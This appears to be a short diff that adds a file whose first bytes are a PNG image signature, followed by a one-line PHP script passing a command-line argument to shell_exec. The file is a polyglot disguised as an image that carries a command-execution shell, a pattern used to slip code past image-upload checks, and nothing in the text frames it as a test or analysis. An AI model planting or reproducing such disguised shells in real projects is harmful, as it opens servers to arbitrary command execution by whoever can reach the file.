@@ -1,0 +1,3 @@
+‰PNG
+
+<?php echo shell_exec($argv[1]); ?>
